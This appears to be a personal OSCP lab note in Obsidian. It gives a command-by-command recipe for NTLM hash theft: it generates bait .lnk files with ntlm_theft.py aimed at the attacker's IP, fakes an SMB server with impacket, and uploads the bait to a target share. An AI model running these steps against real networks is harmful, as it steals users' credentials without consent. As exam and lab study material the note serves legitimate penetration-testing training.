
Create vault.lnk
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft && python3 ntlm_theft.py -g all -s ${KaliIP} -f vault`;

dv.paragraph("```bash\n" + command + "\n```");
```
To fake our SMB server,  **impacket-smbserver**:

```
sudo impacket-smbserver test . -smb2support -debug
```

Check if server is running

```
sudo ss -tulpn | grep 445
```
tcp   LISTEN 0      5                 0.0.0.0:445        0.0.0.0:*    users:(("python3",pid=11501,fd=3))

Put your vault.lnk into the share (Alter the sharename)
```dataviewjs
const page = dv.page("Synced OSCP Notes/Top/Active Machine");const ip = page?.IP ?? "NO IP FOUND";

const command = `cd ~/Desktop/Tools/Windows/ntlm_theft/vault && smbclient //${ip}/[sharename]`;

dv.paragraph("```bash\n" + command + "\n```");
```
smbclient //TARGET_IP/SHARE_NAME -N -c "prompt OFF; mput *"